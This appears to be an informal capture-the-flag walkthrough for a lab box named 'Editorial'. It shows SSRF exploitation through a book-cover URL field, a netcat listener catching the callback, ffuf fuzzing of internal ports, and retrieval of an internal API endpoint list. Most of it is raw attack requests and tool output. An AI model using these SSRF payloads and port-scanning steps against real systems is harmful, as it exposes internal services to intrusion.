


Send a URL through the fucking book cover URL and boom you have what you need.

I sent my IP with the port of 9001

```
kali@kali ~> nc -nvlp 9001
listening on [any] 9001 ...
connect to [10.10.14.29] from (UNKNOWN) [10.10.11.20] 42420
GET / HTTP/1.1
Host: 10.10.14.29:9001
User-Agent: python-requests/2.25.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive

```




when clicking the preview button theres a request where you can do the SSRF stuff




```
POST /upload-cover HTTP/1.1
Host: editorial.htb
Content-Length: 308
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryy1LwO1h4BtQculuK
Accept: */*
Sec-GPC: 1
Accept-Language: en-US,en;q=0.8
Origin: http://editorial.htb
Referer: http://editorial.htb/upload
Accept-Encoding: gzip, deflate, br
Connection: close

------WebKitFormBoundaryy1LwO1h4BtQculuK
Content-Disposition: form-data; name="bookurl"

https://127.0.0.1:9132
------WebKitFormBoundaryy1LwO1h4BtQculuK
Content-Disposition: form-data; name="bookfile"; filename=""
Content-Type: application/octet-stream




------WebKitFormBoundaryy1LwO1h4BtQculuK--

```





Delete the accept-encoding because that tells the remote server to send back compressed data, to save bandwidth. sometimes this works other times it doesnt but the idea is when using a request make sure to specify the protocol your using because it defaults to HTTPS. basically just did an iteration too on the port to find the port 



Now to use ffuf

```
┌──(kali㉿kali)-[~]
└─$ ffuf -request here2.req -request-proto http -w <(seq 0 10000) -k

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://editorial.htb/upload-cover
 :: Wordlist         : FUZZ: /dev/fd/63
 :: Header           : Connection: close
 :: Header           : Host: editorial.htb
 :: Header           : User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
 :: Header           : Sec-GPC: 1
 :: Header           : Accept-Language: en-US,en;q=0.8
 :: Header           : Origin: http://editorial.htb
 :: Header           : Referer: http://editorial.htb/upload
 :: Header           : Accept-Encoding: gzip, deflate, br
 :: Header           : Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryy1LwO1h4BtQculuK
 :: Header           : Accept: */*
 :: Data             : ------WebKitFormBoundaryy1LwO1h4BtQculuK
Content-Disposition: form-data; name="bookurl"

https://127.0.0.1:FUZZ
------WebKitFormBoundaryy1LwO1h4BtQculuK
Content-Disposition: form-data; name="bookfile"; filename=""
Content-Type: application/octet-stream




------WebKitFormBoundaryy1LwO1h4BtQculuK--
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

29                      [Status: 200, Size: 61, Words: 1, Lines: 1, Duration: 189ms]
39                      [Status: 200, Size: 61, Words: 1, Lines: 1, Duration: 189ms]
3                       [Status: 200, Size: 61, Words: 1, Lines: 1, Duration: 192ms]
5                       [Status: 200, Size: 61, Words: 1, Lines: 1, Duration: 192ms]
4                       [Status: 200, Size: 61, Words: 1, Lines: 1, Duration: 190ms]
31                      [Status: 200, Size: 61, Words: 1, Lines: 1, Duration: 191ms]
30                      [Status: 200, Size: 61, Words: 1, Lines: 1, Duration: 196ms]
0                       [Status: 200, Size: 61, Words: 1, Lines: 1, Duration: 196ms]

```



Now to filter

```
┌──(kali㉿kali)-[~]
└─$ ffuf -request here.req -request-proto http -w <(seq 0 10000) -k -fs 61

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://editorial.htb/upload-cover
 :: Wordlist         : FUZZ: /dev/fd/63
 :: Header           : User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
 :: Header           : Origin: http://editorial.htb
 :: Header           : Host: editorial.htb
 :: Header           : Accept: */*
 :: Header           : Sec-GPC: 1
 :: Header           : Accept-Language: en-US,en;q=0.8
 :: Header           : Referer: http://editorial.htb/upload
 :: Header           : Connection: close
 :: Header           : Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryy1LwO1h4BtQculuK
 :: Data             : ------WebKitFormBoundaryy1LwO1h4BtQculuK
Content-Disposition: form-data; name="bookurl"

http://127.0.0.1:FUZZ/
------WebKitFormBoundaryy1LwO1h4BtQculuK
Content-Disposition: form-data; name="bookfile"; filename=""
Content-Type: application/octet-stream


------WebKitFormBoundaryy1LwO1h4BtQculuK--
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 61
________________________________________________

5000                    [Status: 200, Size: 51, Words: 1, Lines: 1, Duration: 207ms]
:: Progress: [10001/10001] :: Job [1/1] :: 105 req/sec :: Duration: [0:01:59] :: Errors: 2 ::

```



```
POST /upload-cover HTTP/1.1
Host: editorial.htb
Content-Length: 308
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryy1LwO1h4BtQculuK
Accept: */*
Sec-GPC: 1
Accept-Language: en-US,en;q=0.8
Origin: http://editorial.htb
Referer: http://editorial.htb/upload
Accept-Encoding: gzip, deflate, br
Connection: close


------WebKitFormBoundaryy1LwO1h4BtQculuK
Content-Disposition: form-data; name="bookurl"



http://127.0.0.1:5000/
------WebKitFormBoundaryy1LwO1h4BtQculuK
Content-Disposition: form-data; name="bookfile"; filename=""
Content-Type: application/octet-stream





------WebKitFormBoundaryy1LwO1h4BtQculuK--

```


```
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Tue, 18 Jun 2024 17:03:26 GMT
Content-Type: text/html; charset=utf-8
Connection: close
Content-Length: 51



static/uploads/8c24fac1-4a1b-41f4-bd5b-0ca5b32758ef
```



```javascript
kali@kali ~/Downloads> cat d550ca73-545a-45f8-a1d7-59b6521d4409 | jq
{
  "messages": [
    {
      "promotions": {
        "description": "Retrieve a list of all the promotions in our library.",
        "endpoint": "/api/latest/metadata/messages/promos",
        "methods": "GET"
      }
    },
    {
      "coupons": {
        "description": "Retrieve the list of coupons to use in our library.",
        "endpoint": "/api/latest/metadata/messages/coupons",
        "methods": "GET"
      }
    },
    {
      "new_authors": {
        "description": "Retrieve the welcome message sended to our new authors.",
        "endpoint": "/api/latest/metadata/messages/authors",
        "methods": "GET"
      }
    },
    {
      "platform_use": {
        "description": "Retrieve examples of how to use the platform.",
        "endpoint": "/api/latest/metadata/messages/how_to_use_platform",
        "methods": "GET"
      }
    }
  ],
  "version": [
    {
      "changelog": {
        "description": "Retrieve a list of all the versions and updates of the api.",
        "endpoint": "/api/latest/metadata/changelog",
        "methods": "GET"
      }
    },
    {
      "latest": {
        "description": "Retrieve the last version of api.",
        "endpoint": "/api/latest/metadata",
        "methods": "GET"
      }
    }
  ]
}

```


now check all of them




----

Checking if its internal or not


```
POST /upload-cover HTTP/1.1
Host: editorial.htb
Content-Length: 308
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryy1LwO1h4BtQculuK
Accept: */*
Sec-GPC: 1
Accept-Language: en-US,en;q=0.8
Origin: http://editorial.htb
Referer: http://editorial.htb/upload
Accept-Encoding: gzip, deflate, br
Connection: close



------WebKitFormBoundaryy1LwO1h4BtQculuK
Content-Disposition: form-data; name="bookurl"



http://10.10.11.20:5000/
------WebKitFormBoundaryy1LwO1h4BtQculuK
Content-Disposition: form-data; name="bookfile"; filename=""
Content-Type: application/octet-stream




------WebKitFormBoundaryy1LwO1h4BtQculuK--


```


```
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Tue, 18 Jun 2024 09:02:20 GMT
Content-Type: text/html; charset=utf-8
Connection: close
Content-Length: 61



/static/images/unsplash_photo_1630734277837_ebe62757b6e0.jpeg
```



now to use the internal ip

```
POST /upload-cover HTTP/1.1

Host: editorial.htb

Content-Length: 308

User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36

Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryy1LwO1h4BtQculuK

Accept: */*

Sec-GPC: 1

Accept-Language: en-US,en;q=0.8

Origin: http://editorial.htb

Referer: http://editorial.htb/upload

Accept-Encoding: gzip, deflate, br

Connection: close



------WebKitFormBoundaryy1LwO1h4BtQculuK

Content-Disposition: form-data; name="bookurl"



http://127.0.0.1:5000/

------WebKitFormBoundaryy1LwO1h4BtQculuK

Content-Disposition: form-data; name="bookfile"; filename=""

Content-Type: application/octet-stream





------WebKitFormBoundaryy1LwO1h4BtQculuK--


```


```
HTTP/1.1 200 OK

Server: nginx/1.18.0 (Ubuntu)

Date: Tue, 18 Jun 2024 09:03:23 GMT

Content-Type: text/html; charset=utf-8

Connection: close

Content-Length: 51



static/uploads/c41dcace-531d-41de-a127-f85146702295  <------- IMPORTANT THIS HOLDS THE API LIST
```


